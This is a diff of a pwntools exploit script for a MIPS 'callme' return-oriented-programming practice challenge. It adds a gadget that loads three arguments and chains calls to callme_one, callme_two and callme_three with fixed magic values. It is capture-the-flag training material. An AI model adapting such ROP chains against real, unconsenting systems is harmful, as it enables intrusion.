@@ -5,7 +5,7 @@ elf = context.binary = ELF("./callme_mipsel")
 
 
 class ROP:
-    gadget1 = 0x0
+    load_args = 0x00400bb0  # lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
 
 
 def conn():
@@ -24,10 +24,24 @@ def solve():
 
     payload = [
         padding,
-        ROP.gadget1,
-        0xDEADBEEF,
-        elf.plt.system,
-        ROP.bin_cat
+        ROP.load_args,
+        0xAAAAAAAA,
+        elf.plt.callme_one,
+        0xd00df00d,
+        0xcafebabe,
+        0xdeadbeef,
+        ROP.load_args,
+        0xAAAAAAAA,
+        elf.plt.callme_two,
+        0xd00df00d,
+        0xcafebabe,
+        0xdeadbeef,
+        ROP.load_args,
+        0xAAAAAAAA,
+        elf.plt.callme_three,
+        0xd00df00d,
+        0xcafebabe,
+        0xdeadbeef,
     ]
 
     io.sendline(flat(payload))
